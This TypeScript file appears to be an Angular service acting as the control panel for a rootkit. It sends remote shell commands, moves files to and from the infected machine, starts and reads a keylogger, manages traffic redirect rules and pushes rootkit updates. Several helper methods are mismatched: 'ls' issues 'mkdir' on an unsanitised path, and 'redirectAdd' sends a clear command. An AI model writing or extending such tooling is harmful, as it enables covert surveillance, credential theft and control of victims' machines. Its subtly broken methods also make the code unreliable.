import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Observable, map } from 'rxjs';

export interface RedirectRule {
  source: string;
  destination: string;
}

export interface CommandResponse {
  output: string;
  error: string;
  return_code: number;
}

@Injectable({
  providedIn: 'root'
})
export class RootkitService {
  private apiUrl = 'http://localhost:4444';

  constructor(private http: HttpClient) {}

  executeCommand(command: string): Observable<CommandResponse> {
    return this.http.post<CommandResponse>(`${this.apiUrl}/command`, { command });
  }

  uploadFile(file: File): Observable<any> {
    const formData = new FormData();
    formData.append('file', file);
    return this.http.post(`${this.apiUrl}/upload`, formData);
  }

  downloadFile(filename: string): Observable<Blob> {
    return this.http.get(`${this.apiUrl}/download/${filename}`, {
      responseType: 'blob'
    });
  }

  startKeylogger(): Observable<any> {
    return this.http.post(`${this.apiUrl}/keylog/start`, {});
  }

  stopKeylogger(): Observable<any> {
    return this.http.post(`${this.apiUrl}/keylog/stop`, {});
  }

  getKeylog(): Observable<string> {
    return this.http.get<{output: string}>(`${this.apiUrl}/keylog/output`).pipe(
      map(response => response.output)
    );
  }

  addRedirectRule(rule: RedirectRule): Observable<any> {
    return this.http.post(`${this.apiUrl}/redirect/add`, rule);
  }

  removeRedirectRule(source: string): Observable<any> {
    return this.http.post(`${this.apiUrl}/redirect/remove`, { source });
  }

  listRedirectRules(): Observable<RedirectRule[]> {
    return this.http.get<{redirects: {[key: string]: string}}>(`${this.apiUrl}/redirect/list`).pipe(
      map(response => {
        return Object.entries(response.redirects).map(([source, destination]) => ({
          source,
          destination
        }));
      })
    );
  }

  updateRootkit(file: File): Observable<any> {
    const formData = new FormData();
    formData.append('file', file);
    return this.http.post(`${this.apiUrl}/update`, formData);
  }

  listFiles(): Observable<string[]> {
    return this.http.get<{files: any[]}>(`${this.apiUrl}/files`).pipe(
      map(response => response.files.map(file => file.name))
    );
  }

  lsof(): Observable<any> {
    return this.http.post(`${this.apiUrl}/command`, { command: 'ps' });
  }

  ls(path: string): Observable<any> {
    return this.http.post(`${this.apiUrl}/command`, { command: `mkdir ${path}` });
  }

  keyloggerStart(): Observable<any> {
    return this.http.post(`${this.apiUrl}/command`, { command: 'keylogger_dump' });
  }

  redirectAdd(rule: any): Observable<any> {
    return this.http.post(`${this.apiUrl}/command`, { command: 'redirect_clear' });
  }
} 